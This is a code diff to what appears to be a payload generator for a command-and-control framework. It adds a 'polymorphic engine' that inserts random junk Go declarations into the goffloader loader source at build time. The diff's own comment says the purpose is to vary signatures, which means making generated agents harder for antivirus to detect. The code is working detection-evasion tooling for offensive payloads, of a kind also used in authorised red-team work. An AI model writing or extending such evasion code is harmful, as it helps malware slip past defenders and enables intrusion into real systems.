@@ -31,6 +31,7 @@ import subprocess
 import tempfile
 import shutil
 from cryptography.fernet import Fernet
+import re
 
 class PolymorphicEngine:
     def __init__(self):
@@ -89,6 +90,68 @@ class PolymorphicEngine:
         ]
 
         return random.choice(dead_code_templates)
+
+    def generate_go_junk_code(self):
+        # Templates for valid Go package-level declarations (variables and functions)
+        junk_templates = [
+            # Global variable declarations
+            f"var _{self.generate_random_name()} = {random.randint(0, 1000)}",
+            f"var _{self.generate_random_name()} = \"{self.generate_random_name()}\"",
+            f"var _{self.generate_random_name()} bool = {random.choice(['true', 'false'])}",
+
+            # Global function declarations that do nothing
+            f"func _{self.generate_random_name()}() {{ /* {self.generate_random_name()} */ }}",
+            f"func _{self.generate_random_name()}() int {{ return {random.randint(1, 100)} }}",
+            f"func _{self.generate_random_name()}() {{ _ = {random.randint(0, 1000)} }}",
+
+            # Comment blocks with random content (valid anywhere)
+            f"// {self.generate_random_name()} {self.generate_random_name()}",
+            f"/* {self.generate_random_name()} {self.generate_random_name()} */",
+        ]
+
+        return random.choice(junk_templates)
+
+    def inject_junk_code_into_go_file(self, file_content, num_junks=None):
+        if num_junks is None:
+            num_junks = random.randint(1, 5)  # Add 1-5 junk snippets
+
+        lines = file_content.split('\n')
+
+        # Find insertion point - only after imports and before any functions
+        insert_pos = -1
+        in_import_block = False
+
+        for i, line in enumerate(lines):
+            stripped = line.strip()
+
+            # Look for end of imports section
+            if stripped.startswith('import ('):
+                in_import_block = True
+                continue
+            elif in_import_block and stripped == ')':
+                in_import_block = False
+                insert_pos = i + 1  # Position right after import block
+                break
+            elif not in_import_block and stripped.startswith('import '):
+                # Single line import
+                insert_pos = i + 1  # Position right after import line
+                break
+
+        # If no imports found, insert after package declaration
+        if insert_pos == -1:
+            for i, line in enumerate(lines):
+                stripped = line.strip()
+                if stripped.startswith('package '):
+                    insert_pos = i + 1
+                    break
+
+        # If we found a valid insertion point, add junk code there
+        if insert_pos != -1:
+            for _ in range(num_junks):
+                junk_code = self.generate_go_junk_code()
+                lines.insert(insert_pos, junk_code)
+
+        return '\n'.join(lines)
 
 
 class TrinityPayloadGenerator:
@@ -946,6 +1009,9 @@ class TrinityPayloadGenerator:
             if include_bof or include_execute_pe:
                 # Copy local goffloader to temp directory for building
                 import shutil
+                import os
+                from pathlib import Path
+
                 local_goffloader_path = os.path.join(os.path.dirname(__file__), 'goffloader')
                 temp_goffloader_path = os.path.join(temp_dir, 'agents', 'goffloader')
 
@@ -954,6 +1020,27 @@ class TrinityPayloadGenerator:
 
                 # Copy the entire goffloader directory to the temp directory
                 shutil.copytree(local_goffloader_path, temp_goffloader_path, dirs_exist_ok=True)
+
+                # Add randomized junk code to goffloader files to vary signatures
+                # Create a new polymorphic engine instance for junk code generation
+                junk_poly_engine = PolymorphicEngine()
+
+                # Walk through all .go files in the goffloader directory
+                for root, dirs, files in os.walk(temp_goffloader_path):
+                    for file in files:
+                        if file.endswith('.go'):
+                            file_path = os.path.join(root, file)
+
+                            # Read the original file
+                            with open(file_path, 'r', encoding='utf-8') as f:
+                                original_content = f.read()
+
+                            # Inject junk code using the polymorphic engine
+                            junk_content = junk_poly_engine.inject_junk_code_into_go_file(original_content)
+
+                            # Write the modified content back
+                            with open(file_path, 'w', encoding='utf-8') as f:
+                                f.write(junk_content)
 
                 # Just copy the files - don't initialize a separate module for goffloader
                 # The main agent module will handle all dependencies through the replace directive
@@ -967,10 +1054,8 @@ class TrinityPayloadGenerator:
                 if result.returncode != 0:
                     raise Exception(f"Failed to get go-clr dependency: {result.stderr}")
 
-            # Get goffloader PE dependency for PE execution if included
             # The PE module is already copied as part of the goffloader package above
             if include_execute_pe:
-                # Ensure the goffloader PE module is available locally
                 # This is handled by the copy operation above
                 pass
 
